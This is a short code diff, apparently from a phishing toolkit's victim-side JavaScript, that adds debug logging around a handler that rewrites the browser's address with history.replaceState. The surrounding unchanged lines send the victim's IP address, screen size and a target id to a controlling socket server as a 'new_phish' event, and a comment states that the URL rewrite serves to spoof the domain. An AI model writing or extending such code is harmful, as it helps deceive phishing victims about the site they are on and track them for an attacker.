@@ -42,8 +42,11 @@ let viewport_height = height()
 socket.emit('new_phish', viewport_width, viewport_height, client_ip, target_id)
 
 socket.on("push_state", function(new_url){
+  console.log(`Received push_state event: ${new_url}`)
+  console.log(`Current URL before: ${window.location.href}`)
   // Replace the entire URL to spoof the domain
   history.replaceState({}, '', new_url)
+  console.log(`Current URL after: ${window.location.href}`)
 })
 
 socket.on("copy_to_clipboard", function(data){
